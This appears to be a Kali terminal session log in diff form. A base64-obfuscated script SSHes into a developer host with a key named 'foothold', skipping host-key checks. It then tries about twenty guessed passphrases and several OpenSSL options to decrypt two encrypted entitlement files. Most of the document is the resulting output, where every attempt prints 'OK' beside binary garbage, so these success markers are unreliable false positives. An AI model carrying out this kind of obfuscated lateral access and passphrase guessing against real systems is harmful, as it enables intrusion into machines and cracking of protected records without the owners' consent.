@@ -1,0 +1,109 @@
+└─$ └─$ 
+
+┌──(cinder@kali)-[~]
+└─$ └─$ base64 -d > /tmp/k08enc2.sh <<'B64EOF'
+> dGltZW91dCAxMjAgc3NoIC1vIFN0cmljdEhvc3RLZXlDaGVja2luZz1ubyAtbyBDb25uZWN0VGltZW91dD0xMCAtaSB+Ly5zc2gva2VwbGVyb3BzLWZvb3Rob2xkIC1wIDIyMjIgcm93YW5Acm93YW4tZGV2ICcKY2Qgfi93b3JrL3JlZ2lzdHJ5CnB5dGhvbjMgLSA8PCJQWSIKaW1wb3J0IGJhc2U2NApmb3IgbiBpbiBbImswOC0yLWVudGl0bGVtZW50LmVuYyIsImswOC0zLWVudGl0bGVtZW50LmVuYyJdOgogICAgcmF3PWJhc2U2NC5iNjRkZWNvZGUob3BlbihuKS5yZWFkKCkuc3RyaXAoKSkKICAgIG9wZW4oIi90bXAvIituKyIuYmluIiwid2IiKS53cml0ZShyYXcpCiAgICBwcmludChuLGxlbihyYXcpLHJhdy5oZXgoKSkKUFkKZm9yIFAgaW4gImZrLWVudGl0bGVtZW50LWxlZ2FjeS0yMDI2LTA4IiAiRU5ULUFSV0MtRElBRy0wNjk4IiAiVEVOLUFSV0MtMDE5IiAiZGlhZ25vc3RpYy1sb2FkZXIiICJGTEstNi45LjgiICI2OThkNDJjNmExNzc2ZTlmYzAwMmI5MWVmNjg0MzFhZDc3NWUwYzI4IiAiZmllbGRrZXN0LWVudGl0bGVtZW50L3YxIiAiZmllbGRrZXN0LWVudGl0bGVtZW50LXYxIiAiZmllbGRrZXN0LmVudGl0bGVtZW50LXJlY29yZC92MSIgImZpZWxka2VzdC1ma2RpYWctdjEiICJmaWVsZGxpbmstY29ubmVjdG9yLzYuOS44IiAiZmllbGRrZXN0IiAia2VwbGVyb3BzIiAiQ1JSLU9HMiIgIkFSV0MiICJyb3dhbi5pdG8iICJNVE4tNi45LjgiICJsZWdhY3kiICJmay1lbnRpdGxlbWVudCIgImZpZWxka2VzdC1lbnRpdGxlbWVudC1sZWdhY3kiICJmaWVsZGtlc3QgbGVnYWN5IGVudGl0bGVtZW50IiAibGVnYWN5IGVudGl0bGVtZW50IjsgZG8KIGZvciBPUFQgaW4gIiIgIi1tZCBzaGEyNTYiICItcGJrZGYyIC1tZCBzaGEyNTYiICItcGJrZGYyIC1tZCBzaGExIiAiLW1kIHNoYTEiOyBkbwogIE9VVD0kKG9wZW5zc2wgZW5jIC1kIC1hZXMtMjU2LWNiYyAkT1BUIC1pbiAvdG1wL2swOC0yLWVudGl0bGVtZW50LmVuYy5iaW4gLXBhc3MgcGFzczoiJFAiIDI+L2Rldi9udWxsIHwgdHIgLWQgIlwwIikKICBpZiBbIC1uICIkT1VUIiBdOyB0aGVuIGVjaG8gIkswODIgT0sgcGFzcz1bJFBdIG9wdD1bJE9QVF0gb3V0PVskT1VUXSI7IGZpCiAgT1VUPSQob3BlbnNzbCBlbmMgLWQgLWFlcy0yNTYtY2JjICRPUFQgLWluIC90bXAvazA4LTMtZW50aXRsZW1lbnQuZW5jLmJpbiAtcGFzcyBwYXNzOiIkUCIgMj4vZGV2L251bGwgfCB0ciAtZCAiXDAiKQogIGlmIFsgLW4gIiRPVVQiIF07IHRoZW4gZWNobyAiSzA4MyBPSyBwYXNzPVskUF0gb3B0PVskT1BUXSBvdXQ9WyRPVVRdIjsgZmkKIGRvbmUKZG9uZQplY2hvIGRvbmUKJyAyPiYxIHwgaGVhZCAtMTAwCg==
+> B64EOF
+
+┌──(cinder@kali)-[~]
+└─$ └─$ chmod +x /tmp/k08enc2.sh; bash /tmp/k08enc2.sh; echo DONEMARK_1795207981223$((6*7))
+k08-2-entitlement.enc 48 53616c7465645f5fa7797a9041b6f96949719ededd84e9897290305fcea4394e02b79b0e7df689fd04f3e1643c802da9
+k08-3-entitlement.enc 48 53616c7465645f5f1613e22314be840151f20a584fc0260992de4f8964e0a977081a420ace502ea3b692502bbc47006a
+K082 OK pass=[fk-entitlement-legacy-2026-08] opt=[] out=[��~׮OE�.�c7��B]
+K083 OK pass=[fk-entitlement-legacy-2026-08] opt=[] out=[��-ڈ��T�gb�T��]
+K082 OK pass=[fk-entitlement-legacy-2026-08] opt=[-md sha256] out=[��~׮OE�.�c7��B]
+K083 OK pass=[fk-entitlement-legacy-2026-08] opt=[-md sha256] out=[��-ڈ��T�gb�T��]
+K082 OK pass=[fk-entitlement-legacy-2026-08] opt=[-pbkdf2 -md sha256] out=[SѢ��]��d�v��{]
+K083 OK pass=[fk-entitlement-legacy-2026-08] opt=[-pbkdf2 -md sha256] out=[�%}�2������]
+K082 OK pass=[fk-entitlement-legacy-2026-08] opt=[-pbkdf2 -md sha1] out=[�v9�\��x��B��]
+K083 OK pass=[fk-entitlement-legacy-2026-08] opt=[-pbkdf2 -md sha1] out=[�������Ny|Z	΍]
+K082 OK pass=[fk-entitlement-legacy-2026-08] opt=[-md sha1] out=[E��:��/*��rO<KV]
+K083 OK pass=[fk-entitlement-legacy-2026-08] opt=[-md sha1] out=[�.���W`F&�أz]
+K082 OK pass=[ENT-ARWC-DIAG-0698] opt=[] out=[�b��So�c?�ҧmB]
+K083 OK pass=[ENT-ARWC-DIAG-0698] opt=[] out=[����Ѧc���]
+K082 OK pass=[ENT-ARWC-DIAG-0698] opt=[-md sha256] out=[�b��So�c?�ҧmB]
+K083 OK pass=[ENT-ARWC-DIAG-0698] opt=[-md sha256] out=[����Ѧc���]
+K082 OK pass=[ENT-ARWC-DIAG-0698] opt=[-pbkdf2 -md sha256] out=[9��u^q�ԊK~�\]
+K083 OK pass=[ENT-ARWC-DIAG-0698] opt=[-pbkdf2 -md sha256] out=[Lj�&�����`�����]
+K082 OK pass=[ENT-ARWC-DIAG-0698] opt=[-pbkdf2 -md sha1] out=[4>�r���V�b5���]
+K083 OK pass=[ENT-ARWC-DIAG-0698] opt=[-pbkdf2 -md sha1] out=[3�T�]�a��E"�3�]
+K082 OK pass=[ENT-ARWC-DIAG-0698] opt=[-md sha1] out=[���4�$_Ƴ��;�b]
+K083 OK pass=[ENT-ARWC-DIAG-0698] opt=[-md sha1] out=[�}\f�/�?T��2Sğ]
+K082 OK pass=[TEN-ARWC-019] opt=[] out=[0UO��&�ohZ:>=%]
+K083 OK pass=[TEN-ARWC-019] opt=[] out=[����G�$��8���]
+K082 OK pass=[TEN-ARWC-019] opt=[-md sha256] out=[0UO��&�ohZ:>=%]
+K083 OK pass=[TEN-ARWC-019] opt=[-md sha256] out=[����G�$��8���]
+K082 OK pass=[TEN-ARWC-019] opt=[-pbkdf2 -md sha256] out=[|�}����&7�����Y2]
+K083 OK pass=[TEN-ARWC-019] opt=[-pbkdf2 -md sha256] out=[��"�RJ�@X�
+P��]
+K082 OK pass=[TEN-ARWC-019] opt=[-pbkdf2 -md sha1] out=[P�}��8NX��J��L]
+K083 OK pass=[TEN-ARWC-019] opt=[-pbkdf2 -md sha1] out=[p�r���������]
+K082 OK pass=[TEN-ARWC-019] opt=[-md sha1] out=[�>`f�s�x=T�ٗ]�]
+K083 OK pass=[TEN-ARWC-019] opt=[-md sha1] out=[ �UiH��RL���`W]
+K082 OK pass=[diagnostic-loader] opt=[] out=[�����*0
+�m�Dd��]
+K083 OK pass=[diagnostic-loader] opt=[] out=[BP�յQD�yn��V�]
+K082 OK pass=[diagnostic-loader] opt=[-md sha256] out=[�����*0
+�m�Dd��]
+K083 OK pass=[diagnostic-loader] opt=[-md sha256] out=[BP�յQD�yn��V�]
+K082 OK pass=[diagnostic-loader] opt=[-pbkdf2 -md sha256] out=[?5�uem�Rߴ��]
+K083 OK pass=[diagnostic-loader] opt=[-pbkdf2 -md sha256] out=[�����X׼�	�]
+K082 OK pass=[diagnostic-loader] opt=[-pbkdf2 -md sha1] out=[1��b4�l7z4~3`]
+K083 OK pass=[diagnostic-loader] opt=[-pbkdf2 -md sha1] out=[���.,q��Ɂ�~gl�]
+K082 OK pass=[diagnostic-loader] opt=[-md sha1] out=[��t�Cs��t�EX���]
+K083 OK pass=[diagnostic-loader] opt=[-md sha1] out=[��U��Ґ���_y=��]
+K082 OK pass=[FLK-6.9.8] opt=[] out=[��E��$����+q�]
+K083 OK pass=[FLK-6.9.8] opt=[] out=[$���&�.en@��{*0]
+K082 OK pass=[FLK-6.9.8] opt=[-md sha256] out=[��E��$����+q�]
+K083 OK pass=[FLK-6.9.8] opt=[-md sha256] out=[$���&�.en@��{*0]
+K082 OK pass=[FLK-6.9.8] opt=[-pbkdf2 -md sha256] out=[%`&BY�H���!��;]
+K083 OK pass=[FLK-6.9.8] opt=[-pbkdf2 -md sha256] out=[BZƶg�H���)��]
+K082 OK pass=[FLK-6.9.8] opt=[-pbkdf2 -md sha1] out=[��`�'y2�M}�]
+K083 OK pass=[FLK-6.9.8] opt=[-pbkdf2 -md sha1] out=[zE��G#xx�!��c!]
+K082 OK pass=[FLK-6.9.8] opt=[-md sha1] out=[�A�]r9��u�*��$�]
+K083 OK pass=[FLK-6.9.8] opt=[-md sha1] out=[n��^'��?m;�	$v]
+K082 OK pass=[698d42c6a1776e9fc002b91ef68431ad775e0c28] opt=[] out=[�|�;�Οv���+x�u]
+K083 OK pass=[698d42c6a1776e9fc002b91ef68431ad775e0c28] opt=[] out=[��T�}c{1����r]
+K082 OK pass=[698d42c6a1776e9fc002b91ef68431ad775e0c28] opt=[-md sha256] out=[�|�;�Οv���+x�u]
+K083 OK pass=[698d42c6a1776e9fc002b91ef68431ad775e0c28] opt=[-md sha256] out=[��T�}c{1����r]
+K082 OK pass=[698d42c6a1776e9fc002b91ef68431ad775e0c28] opt=[-pbkdf2 -md sha256] out=[>�;b��
+Fu*�P]
+K083 OK pass=[698d42c6a1776e9fc002b91ef68431ad775e0c28] opt=[-pbkdf2 -md sha256] out=[����da�Ϣ�L����]
+K082 OK pass=[698d42c6a1776e9fc002b91ef68431ad775e0c28] opt=[-pbkdf2 -md sha1] out=[��`s�F	l����dy]
+K083 OK pass=[698d42c6a1776e9fc002b91ef68431ad775e0c28] opt=[-pbkdf2 -md sha1] out=[��:7a�[�ec��N�o�]
+K082 OK pass=[698d42c6a1776e9fc002b91ef68431ad775e0c28] opt=[-md sha1] out=[�L�����R�t��F��]
+K083 OK pass=[698d42c6a1776e9fc002b91ef68431ad775e0c28] opt=[-md sha1] out=[:�WoY�Y$�2��a]
+K082 OK pass=[fieldkest-entitlement/v1] opt=[] out=[@� �c�Vž��<w��]
+K083 OK pass=[fieldkest-entitlement/v1] opt=[] out=[/^�J��o?R�-e]
+K082 OK pass=[fieldkest-entitlement/v1] opt=[-md sha256] out=[@� �c�Vž��<w��]
+K083 OK pass=[fieldkest-entitlement/v1] opt=[-md sha256] out=[/^�J��o?R�-e]
+K082 OK pass=[fieldkest-entitlement/v1] opt=[-pbkdf2 -md sha256] out=[�������Ӣj]U�]
+K083 OK pass=[fieldkest-entitlement/v1] opt=[-pbkdf2 -md sha256] out=[�+@�쉥q�Zq"��]
+K082 OK pass=[fieldkest-entitlement/v1] opt=[-pbkdf2 -md sha1] out=[���KG�K��T�mi�]
+K083 OK pass=[fieldkest-entitlement/v1] opt=[-pbkdf2 -md sha1] out=[�zX�s��,���u�^]
+K082 OK pass=[fieldkest-entitlement/v1] opt=[-md sha1] out=[�A3Q�Vڥ,`�	]
+K083 OK pass=[fieldkest-entitlement/v1] opt=[-md sha1] out=[m�|�wz�H��9+��]
+K082 OK pass=[fieldkest-entitlement-v1] opt=[] out=[������I;iF��Kc�]
+K083 OK pass=[fieldkest-entitlement-v1] opt=[] out=[��a��!��q��{$�]
+K082 OK pass=[fieldkest-entitlement-v1] opt=[-md sha256] out=[������I;iF��Kc�]
+K083 OK pass=[fieldkest-entitlement-v1] opt=[-md sha256] out=[��a��!��q��{$�]
+K082 OK pass=[fieldkest-entitlement-v1] opt=[-pbkdf2 -md sha256] out=[	�e���u\���
+��Z]
+K083 OK pass=[fieldkest-entitlement-v1] opt=[-pbkdf2 -md sha256] out=[ړ�q���N?3�x��]
+K082 OK pass=[fieldkest-entitlement-v1] opt=[-pbkdf2 -md sha1] out=[$�[�������V����]
+K083 OK pass=[fieldkest-entitlement-v1] opt=[-pbkdf2 -md sha1] out=[�m� ��+��v!޸]
+K082 OK pass=[fieldkest-entitlement-v1] opt=[-md sha1] out=[�AV7�*�1����]
+K083 OK pass=[fieldkest-entitlement-v1] opt=[-md sha1] out=[O��|j��Rgδ]
+K082 OK pass=[fieldkest.entitlement-record/v1] opt=[] out=[v�Ip�K��Ų��n]
+K083 OK pass=[fieldkest.entitlement-record/v1] opt=[] out=[TD�PC��kq����g]
+K082 OK pass=[fieldkest.entitlement-record/v1] opt=[-md sha256] out=[v�Ip�K��Ų��n]
+K083 OK pass=[fieldkest.entitlement-record/v1] opt=[-md sha256] out=[TD�PC��kq����g]
+K082 OK pass=[fieldkest.entitlement-record/v1] opt=[-pbkdf2 -md sha256] out=[��K��A��b�3���]
+K083 OK pass=[fieldkest.entitlement-record/v1] opt=[-pbkdf2 -md sha256] out=[<|��=;vnf�/��9�]
+K082 OK pass=[fieldkest.entitlement-record/v1] opt=[-pbkdf2 -md sha1] out=[1��ZM�\�����]
+K083 OK pass=[fieldkest.entitlement-record/v1] opt=[-pbkdf2 -md sha1] out=[�s(��O��m�H��}�]
+K082 OK pass=[fieldkest.entitlement-record/v1] opt=[-md sha1] out=[c�>�7l�=R�OZ�]
+K083 OK pass=[fieldkest.entitlement-record/v1] opt=[-md sha1] out=[r�*0؏!�(2<)ѱR]
+K082 OK pass=[fieldkest-fkdiag-v1] opt=[] out=[Ye���K�����?��&]
+K083 OK pass=[fieldkest-fkdiag-v1] opt=[] out=[Z�窏���iG~�/�]
+K082 OK pass=[fieldkest-fkdiag-v1] opt=[-md sha256] out=[Ye���K�����?��&]
